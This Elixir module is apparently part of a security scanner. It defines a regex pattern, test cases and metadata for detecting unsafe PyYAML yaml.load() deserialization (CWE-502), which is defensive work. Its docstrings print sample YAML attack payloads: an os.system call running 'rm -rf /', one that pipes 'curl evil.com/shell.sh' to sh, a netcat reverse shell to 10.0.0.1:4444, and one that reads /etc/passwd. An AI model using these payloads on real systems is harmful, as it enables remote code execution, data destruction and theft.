defmodule RsolvApi.Security.Patterns.Python.UnsafeYamlLoad do
  @moduledoc """
  Pattern for detecting unsafe YAML loading in Python code.
  
  Detects usage of yaml.load() without SafeLoader which can execute arbitrary code.
  This is a critical vulnerability that has been exploited in multiple CVEs.
  """

  alias RsolvApi.Security.Pattern

  @doc """
  Returns the complete pattern for detecting unsafe YAML loading.
  
  ## Examples
  
      iex> pattern = RsolvApi.Security.Patterns.Python.UnsafeYamlLoad.pattern()
      iex> pattern.id
      "python-unsafe-yaml-load"
      iex> pattern.severity
      :critical
      iex> pattern.type
      :deserialization
  """
  def pattern do
    %Pattern{
      id: "python-unsafe-yaml-load",
      name: "Unsafe YAML Deserialization",
      description: "Detects unsafe usage of yaml.load() which can execute arbitrary Python code",
      type: :deserialization,
      severity: :critical,
      languages: ["python"],
      regex: ~r/
        # yaml.load() without SafeLoader or with FullLoader
        yaml\.load\s*\((?:[^,)]|,\s*Loader\s*=\s*yaml\.FullLoader)*\)|
        # from yaml import load
        from\s+yaml\s+import\s+.*\bload\b|
        # Direct load() call after import
        (?:^|\s)load\s*\([^,)]*\)
      /x,
      default_tier: :ai,
      cwe_id: "CWE-502",
      owasp_category: "A08:2021",
      recommendation: "Use yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader)",
      test_cases: %{
        vulnerable: [
          "data = yaml.load(user_input)",
          "config = yaml.load(f)",
          "from yaml import load; data = load(request.body)",
          "result = yaml.load(untrusted_data, Loader=yaml.FullLoader)"
        ],
        safe: [
          "data = yaml.safe_load(user_input)",
          "data = yaml.load(user_input, Loader=yaml.SafeLoader)",
          "data = json.loads(user_input)"
        ]
      }
    }
  end

  @doc """
  Returns test cases for the pattern.
  """
  def test_cases do
    %{
      positive: [
        %{
          code: """
          import yaml
          data = yaml.load(user_input)
          """,
          description: "Basic unsafe yaml.load() usage"
        },
        %{
          code: """
          import yaml
          with open('config.yml') as f:
              config = yaml.load(f)
          """,
          description: "Unsafe yaml.load() reading from file"
        },
        %{
          code: """
          from yaml import load
          data = load(request.body)
          """,
          description: "Imported load function without SafeLoader"
        },
        %{
          code: """
          import yaml
          # This is dangerous
          result = yaml.load(untrusted_data, Loader=yaml.FullLoader)
          """,
          description: "Using FullLoader which is also unsafe"
        }
      ],
      negative: [
        %{
          code: """
          import yaml
          data = yaml.safe_load(user_input)
          """,
          description: "Using safe_load which is secure"
        },
        %{
          code: """
          import yaml
          data = yaml.load(user_input, Loader=yaml.SafeLoader)
          """,
          description: "Using SafeLoader explicitly"
        },
        %{
          code: """
          import json
          data = json.loads(user_input)
          """,
          description: "Using JSON instead of YAML"
        },
        %{
          code: """
          # yaml.load() in a comment is fine
          data = parse_config(input)
          """,
          description: "Pattern in comment should not match"
        }
      ]
    }
  end

  @doc """
  Returns examples of vulnerable and fixed code.
  """
  def examples do
    %{
      vulnerable: %{
        "Basic unsafe load" => """
        import yaml
        
        # This allows arbitrary code execution
        config = yaml.load(user_provided_yaml)
        """,
        "Loading from file" => """
        import yaml
        
        with open('user_upload.yml', 'r') as f:
            # Dangerous if file content is not trusted
            data = yaml.load(f)
        """,
        "Using FullLoader" => """
        import yaml
        
        # FullLoader is still unsafe for untrusted data
        settings = yaml.load(config_string, Loader=yaml.FullLoader)
        """
      },
      fixed: %{
        "Use safe_load" => """
        import yaml
        
        # safe_load only constructs simple Python objects
        config = yaml.safe_load(user_provided_yaml)
        """,
        "Use SafeLoader explicitly" => """
        import yaml
        
        # Explicitly specify SafeLoader
        data = yaml.load(user_input, Loader=yaml.SafeLoader)
        """,
        "Validate and use JSON" => """
        import json
        
        # JSON is safe by default
        config = json.loads(user_provided_json)
        """
      }
    }
  end

  @doc """
  Returns references for the vulnerability.
  """
  def references do
    [
      "https://cwe.mitre.org/data/definitions/502.html",
      "https://owasp.org/www-project-top-ten/2021/Top_10/A08_2021-Software_and_Data_Integrity_Failures/",
      "https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation",
      "https://python.land/data-processing/python-yaml",
      "https://pyyaml.org/wiki/PyYAMLDocumentation"
    ]
  end

  @doc """
  Returns detailed vulnerability description.
  """
  def vulnerability_description do
    """
    YAML deserialization in Python using yaml.load() can execute arbitrary code.
    This is not a bug but a feature of YAML that allows it to instantiate any
    Python object, including those that execute code upon creation.
    
    ## Attack Mechanism
    
    1. **Object Instantiation**: YAML can create any Python object using tags
    2. **Code Execution**: Objects can execute code in __init__ or __reduce__
    3. **System Compromise**: Attackers can run OS commands, read files, etc.
    
    ## Example Attack Payload
    
    ```yaml
    !!python/object/apply:os.system
    args: ['rm -rf /']
    ```
    
    ## Real CVE Examples
    
    - **CVE-2020-14343**: PyYAML vulnerability allowing arbitrary code execution
    - **CVE-2019-20477**: PyYAML vulnerability in versions before 5.2
    - **CVE-2020-1747**: PyYAML vulnerability allowing arbitrary command execution
    
    ## Safe Alternatives
    
    - **yaml.safe_load()**: Only loads standard YAML tags (strings, lists, dicts)
    - **yaml.load(data, Loader=yaml.SafeLoader)**: Explicit safe loader
    - **JSON**: Consider JSON for data that doesn't need YAML features
    - **Validation**: Always validate deserialized data structure
    """
  end

  @doc """
  Comprehensive vulnerability metadata for unsafe YAML deserialization in Python.
  
  This metadata documents the critical security implications of using yaml.load()
  without SafeLoader, which allows arbitrary code execution through object deserialization.
  """
  def vulnerability_metadata do
    %{
      description: """
      YAML deserialization in Python using yaml.load() without SafeLoader can execute 
      arbitrary code, making it one of the most dangerous vulnerabilities in Python 
      applications. This is not a bug but a documented feature of YAML that allows 
      instantiation of arbitrary Python objects, including those that execute code 
      upon creation.
      
      The vulnerability occurs because:
      1. YAML supports complex object serialization through tags (e.g., !!python/object)
      2. yaml.load() with default or FullLoader will instantiate these objects
      3. Python objects can execute code in __init__, __reduce__, or __setstate__
      4. Attackers can craft YAML payloads that execute system commands
      
      Attack payload examples:
      ```yaml
      # Execute system command
      !!python/object/apply:os.system
      args: ['curl evil.com/shell.sh | sh']
      
      # Create reverse shell
      !!python/object/apply:subprocess.Popen
      args:
        - ['nc', '-e', '/bin/sh', '10.0.0.1', '4444']
      
      # Read sensitive files
      !!python/object/new:subprocess.check_output
      args:
        - ['cat', '/etc/passwd']
      ```
      
      PyYAML versions before 5.4 had multiple bypass vulnerabilities even when
      attempting to use "safe" loaders, making this a persistent threat.
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-502",
          title: "Deserialization of Untrusted Data",
          url: "https://cwe.mitre.org/data/definitions/502.html"
        },
        %{
          type: :owasp,
          id: "A08:2021",
          title: "OWASP Top 10 2021 - A08 Software and Data Integrity Failures",
          url: "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
        },
        %{
          type: :library_docs,
          id: "pyyaml_warning",
          title: "PyYAML yaml.load(input) Deprecation",
          url: "https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation"
        },
        %{
          type: :research,
          id: "net_square_yaml",
          title: "YAML Deserialization Attack in Python",
          url: "https://net-square.com/yaml-deserialization-attack-in-python.html"
        },
        %{
          type: :research,
          id: "exploit_db_yaml",
          title: "YAML Deserialization Attack in Python - Exploit Database",
          url: "https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf"
        }
      ],
      attack_vectors: [
        "Execute arbitrary system commands via os.system or subprocess",
        "Create reverse shells for remote access",
        "Read sensitive files from the filesystem",
        "Modify or delete critical system files",
        "Install backdoors or malware",
        "Perform Server-Side Request Forgery (SSRF)",
        "Escape containers or sandboxes",
        "Mine cryptocurrency using system resources"
      ],
      real_world_impact: [
        "Complete system compromise through remote code execution",
        "Data breaches via file system access",
        "Cryptocurrency mining on compromised servers",
        "Lateral movement in corporate networks",
        "Supply chain attacks through compromised packages",
        "Denial of service through resource exhaustion",
        "Compliance violations from data exposure",
        "Ransomware deployment on vulnerable systems"
      ],
      cve_examples: [
        %{
          id: "CVE-2020-14343",
          description: "PyYAML arbitrary code execution via FullLoader bypass",
          severity: "critical",
          cvss: 9.8,
          note: "Incomplete fix for CVE-2020-1747 allowing RCE through python/object/new"
        },
        %{
          id: "CVE-2020-1747",
          description: "PyYAML arbitrary code execution in versions before 5.3.1",
          severity: "critical",
          cvss: 9.8,
          note: "RCE through full_load method or FullLoader when processing untrusted YAML"
        },
        %{
          id: "CVE-2019-20477",
          description: "PyYAML insufficient restrictions on load and load_all functions",
          severity: "critical",
          cvss: 9.8,
          note: "Class deserialization issue allowing arbitrary code execution"
        },
        %{
          id: "CVE-2022-1471",
          description: "SnakeYAML (Java) deserialization vulnerability for comparison",
          severity: "critical",
          cvss: 9.8,
          note: "Similar vulnerability pattern affecting Java YAML processing"
        }
      ],
      detection_notes: """
      This pattern detects unsafe YAML loading through:
      
      1. Direct yaml.load() calls without SafeLoader
      2. yaml.load() with FullLoader (still vulnerable)
      3. Imported load function used without safe parameters
      4. Legacy patterns that default to unsafe loading
      
      The pattern does not match:
      - yaml.safe_load() usage
      - yaml.load() with Loader=yaml.SafeLoader
      - Comments containing the pattern
      - JSON loading (which is safe by default)
      """,
      safe_alternatives: [
        "Always use yaml.safe_load() for untrusted input",
        "Explicitly specify yaml.load(data, Loader=yaml.SafeLoader)",
        "Consider using JSON instead if YAML features aren't needed",
        "Validate and sanitize input before deserialization",
        "Use a restricted custom loader that only allows specific types",
        "Implement input validation schemas (e.g., with cerberus or jsonschema)",
        "Run YAML processing in sandboxed environments",
        "Use yaml.safe_dump() for serialization to avoid creating dangerous payloads"
      ],
      additional_context: %{
        common_mistakes: [
          "Using yaml.load() for configuration files without considering security",
          "Trusting user-uploaded YAML files",
          "Using FullLoader thinking it's safe (it's not)",
          "Processing YAML from external APIs without validation",
          "Migrating from JSON to YAML without updating security measures",
          "Using outdated PyYAML versions with known vulnerabilities",
          "Not understanding that YAML is more powerful than JSON"
        ],
        secure_patterns: [
          "config = yaml.safe_load(yaml_string)",
          "data = yaml.load(content, Loader=yaml.SafeLoader)",
          "with open('config.yml') as f: settings = yaml.safe_load(f)",
          "from ruamel.yaml import YAML; yaml = YAML(typ='safe')",
          "import json; config = json.loads(json_string)  # If YAML not needed",
          "# Validate structure after safe loading\nschema.validate(yaml.safe_load(data))"
        ],
        exploitation_tools: [
          "python-deserialization-attack-payload-generator - Generates RCE payloads",
          "PyYAML payload generators for penetration testing",
          "Automated scanners checking for yaml.load() usage",
          "YAML deserialization workshops and CTF challenges"
        ],
        version_notes: [
          "PyYAML < 5.1: yaml.load() defaults to unsafe loading",
          "PyYAML 5.1-5.3: Introduced FullLoader but still vulnerable",
          "PyYAML 5.3.1: Fixed CVE-2020-1747 but not completely",
          "PyYAML 5.4+: Better security but yaml.load() still dangerous with FullLoader",
          "Current versions: yaml.load() requires explicit Loader parameter"
        ]
      }
    }
  end

  @doc """
  Returns AST enhancement rules for improved detection.
  
  ## Examples
  
      iex> enhancement = RsolvApi.Security.Patterns.Python.UnsafeYamlLoad.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:min_confidence, :rules]
      
      iex> enhancement = RsolvApi.Security.Patterns.Python.UnsafeYamlLoad.ast_enhancement()
      iex> enhancement.min_confidence
      0.85
      
      iex> enhancement = RsolvApi.Security.Patterns.Python.UnsafeYamlLoad.ast_enhancement()
      iex> length(enhancement.rules)
      2
  """
  def ast_enhancement do
    %{
      rules: [
        %{
          type: "safe_loader_check",
          description: "Check if SafeLoader is used",
          patterns: [
            "Loader=yaml.SafeLoader",
            "Loader = yaml.SafeLoader",
            "yaml.safe_load",
            "safe_load"
          ]
        },
        %{
          type: "context_check",
          description: "Check data source trustworthiness",
          untrusted_sources: [
            "request",
            "user_input",
            "upload",
            "external",
            "network",
            "socket"
          ]
        }
      ],
      min_confidence: 0.85
    }
  end
end